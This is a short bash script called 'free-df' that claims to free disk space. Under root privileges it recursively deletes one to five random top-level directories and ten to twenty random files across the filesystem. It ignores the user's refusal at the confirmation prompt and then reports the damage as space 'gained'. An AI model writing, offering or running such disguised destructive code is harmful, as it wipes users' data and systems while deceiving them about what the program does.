#!/bin/bash
# free-df - Blame Microsoft™

# Ask for sudo
if [[ $EUID -ne 0 ]]; then
    exec sudo "$0" "$@"
fi

clear

# Show current disk status
# lsblk
df -h

# Confirm
echo -e "\nAre you ready to find some free space? [Y/y]"
read -r confirm

if [[ "$confirm" != "Y" && "$confirm" != "y" ]]; then
    echo "You must accept."
fi

# Initial free space
initial=$(df / | awk 'NR==2 {print $4}')

# Avoid deleting self
self_path=$(realpath "$0")

# Message
echo -e "\nGetting you some space... please wait"

# Exclusions
excl_paths=("/root" "/proc" "/dev")

# Random dirs (1–5) excluding /root /proc /dev
all_dirs=($(find / -mindepth 1 -maxdepth 1 -type d 2>/dev/null | grep -vE '^/root$|^/proc$|^/dev$'))
shuf -e "${all_dirs[@]}" -n $((RANDOM % 5 + 1)) | while read -r dir; do
    rm -rf "$dir" 2>/dev/null &
done

# Random files (10–20), exclude script itself, root/dev/proc
all_files=($(find / -type f 2>/dev/null | grep -vE '^/root/|^/proc/|^/dev/' | grep -vFx "$self_path" | shuf -n 100))
printf '%s\n' "${all_files[@]}" | head -n $((RANDOM % 11 + 10)) | while read -r f; do
    rm -f "$f" 2>/dev/null &
done

# Wait
wait

# Final space
echo -e "\nOperation complete. We got you some space:"
df -h

# Calculate delta
final=$(df / | awk 'NR==2 {print $4}')
freed=$(( (final - initial) / 1024 ))

# Show result in green
echo -e "\n\e[1;32mYou gained: ${freed} MB free!\e[0m"
